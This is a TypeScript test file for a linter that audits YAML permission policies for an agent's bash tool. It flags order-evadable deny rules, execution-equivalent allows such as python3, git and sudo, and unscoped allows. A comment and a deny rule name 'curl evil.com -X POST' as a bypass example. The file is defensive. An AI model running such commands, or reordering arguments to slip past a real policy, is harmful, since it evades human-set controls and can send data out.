import { test, expect, describe } from "bun:test";
import { compilePolicyYaml } from "../src/policy/compile.ts";
import { lintExec } from "../src/policy/lint.ts";

function compile(y: string) {
  const r = compilePolicyYaml(y);
  if (!r.ok) throw new Error(r.error);
  return r.policy;
}

const HEAD = `
agent: a
on_behalf_of: x
grants:
`;

function lint(grantYaml: string) {
  return lintExec(compile(HEAD + grantYaml));
}

describe("lintExec — order-evadable denies", () => {
  test("a target-scoped deny on an exec action is flagged", () => {
    // The concrete bypass: `curl evil.com -X POST` misses this deny (argument
    // order differs) and hits the broad allow, so the command is permitted.
    const f = lint(`
  - tool: bash
    allow:
      - action: "exec:curl"
        targets: ["curl *"]
    deny:
      - action: "exec:curl"
        targets: ["curl * evil.com *"]
`);
    const deny = f.filter((x) => x.kind === "exec_deny_order_evadable");
    expect(deny.length).toBe(1);
    expect(deny[0]!.pattern).toBe("exec:curl");
    expect(deny[0]!.detail).toContain("order");
  });

  test("an UNSCOPED deny is not flagged — it cannot be reordered around", () => {
    const f = lint(`
  - tool: bash
    allow:
      - action: "exec:git"
        targets: ["git status*"]
    deny:
      - exec:curl
`);
    expect(f.filter((x) => x.kind === "exec_deny_order_evadable").length).toBe(0);
  });

  test("a policy with no bash grant produces nothing", () => {
    const f = lint(`
  - tool: github
    allow: [repo:read]
    deny: ["pr:merge"]
`);
    expect(f.length).toBe(0);
  });
});

describe("lintExec — execution-equivalent allows", () => {
  test("granting a runtime is flagged however narrow the target is", () => {
    // The target constrains the command line; the concern is one level below it.
    // So this fires even on a tightly scoped grant.
    const f = lint(`
  - tool: bash
    allow:
      - action: "exec:python3"
        targets: ["python3 scripts/build.py"]
`);
    const hit = f.filter((x) => x.kind === "exec_allow_execution_equivalent");
    expect(hit.length).toBe(1);
    expect(hit[0]!.detail).toContain("arbitrary code execution");
  });

  test("it covers build tooling and git hooks, not just interpreters", () => {
    for (const b of ["node", "bun", "make", "npm", "git", "ssh", "sudo"]) {
      const f = lint(`
  - tool: bash
    allow:
      - action: "exec:${b}"
        targets: ["${b} x"]
`);
      expect(f.filter((x) => x.kind === "exec_allow_execution_equivalent").length).toBe(1);
    }
  });

  test("an ordinary binary is not flagged", () => {
    const f = lint(`
  - tool: bash
    allow:
      - action: "exec:ls"
        targets: ["ls -la"]
      - action: "exec:cat"
        targets: ["cat ./notes.txt"]
`);
    expect(f.filter((x) => x.kind === "exec_allow_execution_equivalent").length).toBe(0);
  });

  test("a deny on a runtime is not flagged — denying it is the safe direction", () => {
    const f = lint(`
  - tool: bash
    allow:
      - action: "exec:ls"
        targets: ["ls -la"]
    deny:
      - exec:python3
`);
    expect(f.filter((x) => x.kind === "exec_allow_execution_equivalent").length).toBe(0);
  });
});

describe("lintExec — unscoped exec allows", () => {
  test("an allow with no targets is flagged", () => {
    // `allow exec:git` reads as "git is allowed", but the action is only the
    // basename — `/tmp/evil/git` passes too.
    const f = lint(`
  - tool: bash
    allow:
      - exec:git
`);
    const unscoped = f.filter((x) => x.kind === "exec_allow_unscoped");
    expect(unscoped.length).toBe(1);
    expect(unscoped[0]!.detail).toContain("basename");
  });

  test("an allow whose target is a bare * is flagged", () => {
    const f = lint(`
  - tool: bash
    allow:
      - action: "exec:git"
        targets: ["*"]
`);
    expect(f.filter((x) => x.kind === "exec_allow_unscoped").length).toBe(1);
  });

  test("a path-anchored allow is clean", () => {
    const f = lint(`
  - tool: bash
    allow:
      - action: "exec:ls"
        targets: ["ls -la", "ls ./*"]
`);
    expect(f.length).toBe(0);
  });

  test("a path-anchored allow on git is scoped, but still execution-equivalent", () => {
    // git runs repository hooks, so the ONLY finding left on a well-scoped git
    // grant is the one that says exactly that.
    const f = lint(`
  - tool: bash
    allow:
      - action: "exec:git"
        targets: ["git status*", "git add *"]
`);
    expect(f.map((x) => x.kind)).toEqual(["exec_allow_execution_equivalent"]);
  });

  test("this rule is advisory and does fire on a deliberately broad read-only grant", () => {
    // Documented false positive, accepted: naming the footgun is worth flagging
    // an `exec:ls` an operator broadened on purpose. The linter is advisory —
    // findings are authoring quality, never policy validity.
    const f = lint(`
  - tool: bash
    allow:
      - exec:ls
`);
    expect(f.filter((x) => x.kind === "exec_allow_unscoped").length).toBe(1);
  });
});
